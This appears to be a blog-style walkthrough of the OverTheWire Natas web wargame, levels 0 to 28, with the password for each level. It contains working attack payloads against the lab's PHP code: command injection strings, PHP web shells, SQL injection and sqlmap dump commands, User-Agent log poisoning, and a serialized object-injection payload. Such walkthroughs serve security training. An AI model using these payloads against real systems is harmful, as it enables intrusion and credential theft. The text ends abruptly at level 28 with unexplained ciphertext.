---
title: "Natas : OverTheWire"
last_modified_at: 2020-10-13T14:40:02-05:00
categories:
  - OverTheWire
author_profile: false
tags:
  - OverTheWire
  - Bandit 
  - Web
---
# Natas
Solution to natas web challenges. [Link to Natas](https://overthewire.org/wargames/natas/)

Username for all levels is natas[level]

Links to all level is : http://natas[level].natas.labs.overthewire.org

# Level 0-1:

password : natas0

The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto

# Level 1-2

Says right clicking has been blocked.

Changing URL to

```jsx
view-source:http://natas1.natas.labs.overthewire.org/
```

The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

# Level 2-3

Says there is nothing in this page. Has a link to image

```jsx
http://natas2.natas.labs.overthewire.org/files/pixel.png
```

/files directory is accessible. It has users.txt file which has the pass.

natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

# Level 3-4

In the comments it says no more leaked directory, not even google will find it. Telling there should be robots.txt file. The /robot.txt provides information about secret directory s3cr3t which has the password.

```jsx
natas4 : Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

# Level 4-5

Access disallowed. Authorized users should come only from

"[http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)"

Which shows we need to change the Referer header to the above link. Used Burp Suite to do that and got the credentials.

natas5 : iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

# Level 5-6

Access disallowed. You are not logged in. 

There is a cookie loggedin and set to value of 0. Changing it to 1 provides the credentials to next level.

natas6 : aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

# Level 6-7

![/assets/images/OverTheWire/Natas/Untitled.png](/assets/images/OverTheWire/Natas/Untitled.png)

Source code includes a file /includes/secret.inc

This file has the secret : FOEIUWGHFEEUHOFUOIU

natas7 : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

# Level 7-8

![/assets/images/OverTheWire/Natas/Untitled%201.png](/assets/images/OverTheWire/Natas/Untitled%201.png)

The link are in format index.php?page=<page> . The query string has the page to include. This has LFI ( Local File Inclusion ) and can be used to extract the password. Also, the hint says the password is in /etc/natas_webpass/natas8

```bash
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

This URL gives the flag

natas8 : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

# Level 8-9

![/assets/images/OverTheWire/Natas/Untitled%202.png](/assets/images/OverTheWire/Natas/Untitled%202.png)

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

The encode secret function first performs base64 encoding and then reverse the output and then changes the output to hex format. If the encoded string is first converted to string, reversed and base64 decoded, we can get the secret.

HEX to String

3d3d516343746d4d6d6c315669563362 : ==QcCtmMml1ViV3b

Reverse

==QcCtmMml1ViV3b : b3ViV1lmMmtCcQ==

Base64 decode

b3ViV1lmMmtCcQ== : oubWYf2kBq

natas9 : W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

# Level 9-10

![/assets/images/OverTheWire/Natas/Untitled%203.png](/assets/images/OverTheWire/Natas/Untitled%203.png)

[S](http://natas9.natas.labs.overthewire.org/index.php?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas10%3B%23&submit=Search)ource:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Since the input is directly sent to the command, it is vulnerable to OS command injection.

Input : . /etc/natas_webpass/natas10;#

Then the command will be

grep -i . /etc/natas_webpass/natas10;# dictionary.txt

natas10 : nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

# Level 10-11

Same as level 9-10 but certain characters are filtered using preg_match function

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Input : . /etc/natas_webpass/natas11 #

Command : grep -i . /etc/natas_webpass/natas11 #dictionary.txt

natas11 : U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

# Level 11-12

![/assets/images/OverTheWire/Natas/Untitled%204.png](/assets/images/OverTheWire/Natas/Untitled%204.png)

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>
```

 We need to inject in the cookies and try to find the key so that the tempdata variable sets the showpassword to yes.

Found out the key "qw8j" using repeated key XOR and used it to encode the cookies.

natas12 : EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

# Level 12-13

![/assets/images/OverTheWire/Natas/Untitled%205.png](/assets/images/OverTheWire/Natas/Untitled%205.png)

Arbitary file could be uploaded so uploaded a php file where command could be executed.

```php
<?php system($_GET['cmd']);?>
```

The hidden field filename's extension is used and by default it is jpg, changed it to php and got the webshell. Cat /etc/natas_webpass/natas13 command used to get creds.

natas13 :  jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

# Level 13-14

![/assets/images/OverTheWire/Natas/Untitled%206.png](/assets/images/OverTheWire/Natas/Untitled%206.png)

Uses exif_imagetype to determine if it is an image. exif_imagetype reads the first bytes of an image to determine if it is an image. 

Created 

```php
GIF<? system($_GET["cmd"]) ?>
```

payload to get a webshell

natas14 : Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

# Level 14-15

![/assets/images/OverTheWire/Natas/Untitled%207.png](/assets/images/OverTheWire/Natas/Untitled%207.png)

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```

SQL injection 

Username = " or 1=1#

natas15 : AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

# Level 15-16

![/assets/images/OverTheWire/Natas/Untitled%208.png](/assets/images/OverTheWire/Natas/Untitled%208.png)

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

Source code shows the possibility of blind SQL injection.

Intercepted the request using burp and store in the "req" file. Then used SQLmap to perform blind SQL injection

```php
sqlmap -r req --risk 3 --level 3 -p username --string="This user exists." -D natas15 -T users --dump
```

natas16 : WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

# Level 16-17

![/assets/images/OverTheWire/Natas/Untitled%209.png](/assets/images/OverTheWire/Natas/Untitled%209.png)

Command Execution . $ is not filtered so used it to get the letters.

First entered Africans to get only one result. Then

```php
Africans$(grep ^a /etc/natas_web_pass/natas17)
```

Used burp suite's intruder to get the password

```php
natas17 : 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

# Level 17-18

![/assets/images/OverTheWire/Natas/Untitled%2010.png](/assets/images/OverTheWire/Natas/Untitled%2010.png)

Source Code

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

There is no error displayed so time based blind SQLi needs to be performed, used SQLMAP to perform the Injection

```console
sqlmap -r req -p username --technique T --dbms mysql -D natas17 --level 3 --risk 3 -T users -C username,password --dump
```

natas18 : xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

# Level 18-19

![/assets/images/OverTheWire/Natas/Untitled%2011.png](/assets/images/OverTheWire/Natas/Untitled%2011.png)

```php
function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```

Bruteforcing PHPSESSID cookie provides the credentials.

The code checks if the PHPSESSID cookie token has session with the admin==1  value. Bruteforced the PHPSESSID cookie and got the result in 119.

natas19 :  4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

# Level 19-20

![/assets/images/OverTheWire/Natas/Untitled%2012.png](/assets/images/OverTheWire/Natas/Untitled%2012.png)

The code is the same as the previous level but the session IDs are not sequential. PHPSESSID cookie is in hex format on decoding we get <integer>-admin.

Bruteforced integer value and got password at integer=281

natas20 : eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

# Level 20-21

![/assets/images/OverTheWire/Natas/Untitled%2013.png](/assets/images/OverTheWire/Natas/Untitled%2013.png)

```php
function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
```

 The read function has explode("\n", $data) code which is vulnerable.

```php
 foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
```

If we set the name to test%0Aadmin 1 then the session sets the admin value to 1. Since the write function appends the data in the file as a result a new key admin can be created with value 1 and we can get the password to next level.

natas21 : IFekPyrQXftziDEsUr3x21sYuahypdgJ

# Level 21-22

![/assets/images/OverTheWire/Natas/Untitled%2014.png](/assets/images/OverTheWire/Natas/Untitled%2014.png)

Colocated website

![/assets/images/OverTheWire/Natas/Untitled%2015.png](/assets/images/OverTheWire/Natas/Untitled%2015.png)

The first website does not have vulnerable code. The colocated site can be exploited.

```php
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

This show if admin key is set to 1 in the request parameter then the session sets the admin key's value to 1. First cookie from first site was copied to the other site so that the changes in session can be reflected on the other site.

```php
http://natas21-experimenter.natas.labs.overthewire.org/?submit&admin=1
```

This sets admin key in $_SESSION to 1 and refreshing the other site shows the key.

natas22 : chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

# Level 22-23

![/assets/images/OverTheWire/Natas/Untitled%2016.png](/assets/images/OverTheWire/Natas/Untitled%2016.png)

```php
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>
<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

 Send revelio as $_GET parameter and intercept the response using burp to get the credentials. There is the redirection in the code and browser redirects to / rather than showing the intermediate webpage.

natas22 : D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

# Level 22-23

![/assets/images/OverTheWire/Natas/Untitled%2017.png](/assets/images/OverTheWire/Natas/Untitled%2017.png)

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

setting passwd to 12345iloveyou shows the password. 

```php
<?php
var_dump("11roshan">10); //true
?>
<?php
var_dump("9roshan">10); //false
?>
The comparison takes the first occurrence of numbers.
```

natas24 : OsRmXFguozKpTZZ5X14zNO43379LZveg

# Level 24-25

![/assets/images/OverTheWire/Natas/Untitled%2018.png](/assets/images/OverTheWire/Natas/Untitled%2018.png)

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>
```

Looking at the code, it is obvious that either the password needs to be bruteforced or strcmp function needs to be bypassed i.e strcmp should return 0. 

Strcmp returns 0 if two strings are same. If an array is sent rather than string it returns NULL. And in php NULL==0 returns true as a result the strcmp function can be bypassed.

```php
http://natas24.natas.labs.overthewire.org/?passwd[]=a
```

natas25 : GHF6X7YwACaYYssHVY05cFq83hRktl4c

# Level 25-26

![/assets/images/OverTheWire/Natas/Untitled%2019.png](/assets/images/OverTheWire/Natas/Untitled%2019.png)

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

For directory traversal str_replace can be bypassed 

```php
filename=str_replace("../","",$filename);
```

using ....// 

The middle portion of ../ is removed and the other ../ stays providing us access to directory traversal. Using this we can access log file

```php
lang=....//logs/natas25_rrt69506q72a61oi0543anirg3.log
```

Now for getting access to natas26 password 

```php
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

HTTP_USER_AGENT could be changed to php code 

```php
User-Agent: <?php system("cat /etc/natas_webpass/natas26")?>
```

This first executes the code in case of error and writes the output in the log file. Using the directory traversal technique we can access the log file and get credentials.

natas26 : oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

# Level 26-27

![/assets/images/OverTheWire/Natas/Untitled%2020.png](/assets/images/OverTheWire/Natas/Untitled%2020.png)

```php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }

if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
```

Object Injection vulnerablilty can be seen in the program. The drawing variable is a base64 encoded serialized string.

```php
<?php

class Logger{

        private $logFile;
        private $initMsg;
        private $exitMsg;
        function __construct(){
        $this->logFile="/var/www/natas/natas26/img/ro.php";
        $this->initMsg="roshan";
        $this->exitMsg="<?php system('cat /etc/natas_webpass/natas27');?>";
        }
}

$lo = new Logger();
echo base64_encode(serialize($lo)); 

?>
//output
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozMzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvcm8ucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6Njoicm9zaGFuIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NDk6Ijw/cGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=
```

When this is set into the drawing cookie then we can get the flag at /img/ro.php.

This works because the $drawing variable upon deserialization becomes an object, since it is not an array, it throws an error and the __destruct function is called which sees the logfile as /var/www/natas/natas26/img/ro.php and writes the payload using the exitMsg member variable. The exitMsg value is written in the log file and upon requesting we get the flag.

natas27 : 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ

# Level 27-28

![/assets/images/OverTheWire/Natas/Untitled%2021.png](/assets/images/OverTheWire/Natas/Untitled%2021.png)

```php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/
function validUser($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
function createUser($link, $usr, $pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysql_query($query, $link);
    if(mysql_affected_rows() > 0){
        return True;
    }
    return False;
}
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);
   

    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }        
    } 
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysql_close($link);
} else {
```

SQL trucation vulnerability is seen in this level. When we submit username as which is more than 64 characters then SQL ignores the remaining bytes but php valid users function does not ignore it. If we submit natas28 with trailing spaces so that it takes more than 64 characters then valid user returns false and creates a user natas28 with the provided password. But it does not keep the characters whose position is more than 64 as a result we store natas28 with trailing spaces. When comparision is done, mysql ignores the trailing spaces and we get to the dump data function which returns all the data whose username is natas28 resulting in creds of next level.

natas28 : JWwR438wkgTsNKBbcJoowyysdM82YjeF

# Level 28-29

![/assets/images/OverTheWire/Natas/Untitled%2022.png](/assets/images/OverTheWire/Natas/Untitled%2022.png)

G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=

G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIYiwNnSJY7KHJGU+XjuMzVvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=